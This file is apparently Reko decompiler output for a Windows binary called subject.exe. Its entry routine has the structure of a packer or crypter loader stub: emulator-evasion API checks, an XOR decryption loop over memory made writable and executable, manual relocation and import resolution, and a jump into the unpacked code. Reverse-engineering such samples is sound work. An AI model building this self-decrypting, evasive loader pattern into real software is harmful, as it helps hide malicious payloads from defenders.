// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: Register Eq_2 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	Eq_3 esi_12 = null;
	Eq_3 edi_17 = (struct <anonymous> *) 0x1F;
	Eq_2 eax_24 = AddUsersToEncryptedFile(&globals->t403020, null);
	if (eax_24 != 0x00)
	{
		Eq_17 eax_34 = AreAllAccessesGranted(~0x00, ~0x00);
		if (eax_34 == 0x00)
			edi_17 = eax_34 + 0x11;
		VirtualProtect(&globals->v401000, 0x3000, 0x40, fp - 0x10);
		struct Eq_40 * ecx_55 = null;
		do
		{
			if (esi_12 == edi_17)
				esi_12 = null;
			ecx_55[4199880] = (struct Eq_40) (esi_12[0x00404000] ^ ecx_55[4199880] ^ 0x90);
			ecx_55 = ecx_55 + 0x01;
			esi_12 = (Eq_3) (esi_12 + 0x01);
		} while (ecx_55 < (struct Eq_40 *) 0x1440);
		struct Eq_64 * edx_287 = &globals->t4028C8;
		uint32 edi_290 = 0x00;
		uint32 dwLoc08_286 = 0x00;
		if (true)
		{
			do
			{
				Eq_84 eax_295 = edx_287->t0004 - 0x08 >> 0x01;
				cui16 * ecx_299 = (char *) &edx_287->t0004 + 0x04;
				if (eax_295 > 0x00)
				{
					Eq_84 ebx_315 = eax_295;
					do
					{
						if ((*ecx_299 & 0xF000) == 0x3000)
						{
							struct Eq_114 * eax_337 = ((word32) *ecx_299 & 0x0FFF) + edx_287->dw0000;
							eax_337->dw401348 = eax_337->dw401348 + 0xF0401348;
						}
						ecx_299 = ecx_299 + 0x01;
						ebx_315 = ebx_315 - 0x01;
					} while (ebx_315 != 0x00);
					edi_290 = dwLoc08_286;
				}
				edi_290 = (word32) edx_287->t0004 + edi_290;
				dwLoc08_286 = edi_290;
				edx_287 = edx_287 + Mem79[edx_287 + 0x04:word32];
			} while (edi_290 < 228);
		}
		struct Eq_75 * edi_113 = &globals->t4020B4;
		struct Eq_75 * dwLoc08_114 = &globals->t4020B4;
		edi_150 = edi_113;
		if (globals->dw4020C4 != 0x00)
		{
			do
			{
				struct Eq_75 * edi_150;
				Eq_172 eax_168 = LoadLibraryA(edi_150->dw000C + 0x00401348);
				if (eax_168 != null)
				{
					word32 ecx_198 = edi_150->dw0000;
					if (ecx_198 == 0x00)
						ecx_198 = edi_150->dw0010;
					word32 * ebp_205 = ecx_198 + 0x00401348;
					word32 * edi_208 = edi_150->dw0010 + 0x00401348;
					if (*ebp_205 != 0x00)
					{
						do
						{
							Eq_227 eax_253;
							int32 ecx_242 = *ebp_205;
							word16 cx_243 = (word16) ecx_242;
							if (ecx_242 < 0x00)
								eax_253 = GetProcAddress(eax_168, (word32) cx_243);
							else
								eax_253 = GetProcAddress(eax_168, ecx_242 + 4199242);
							*edi_208 = (word32) eax_253;
							ebp_205 = ebp_205 + 0x01;
							edi_208 = edi_208 + 0x01;
						} while (*ebp_205 != 0x00);
					}
					edi_150 = dwLoc08_114;
				}
				edi_150 = edi_150 + 0x01;
				dwLoc08_114 = edi_150;
			} while (edi_150->dw0010 != 0x00);
		}
		ptr32 esp_125;
		byte SCZO_126;
		word32 ebx_127;
		word32 ebp_128;
		word32 esi_129;
		byte SZO_130;
		byte C_131;
		word32 edi_132;
		word32 eax_133;
		byte Z_134;
		word32 ecx_135;
		byte dl_136;
		word32 edx_137;
		byte CZ_138;
		word16 ax_139;
		byte S_140;
		word16 cx_141;
		globals->t401DA8();
		*(esp_125 - 0x04) = 0x00;
		ExitProcess(*(esp_125 - 0x04));
	}
	else
		return eax_24;
}

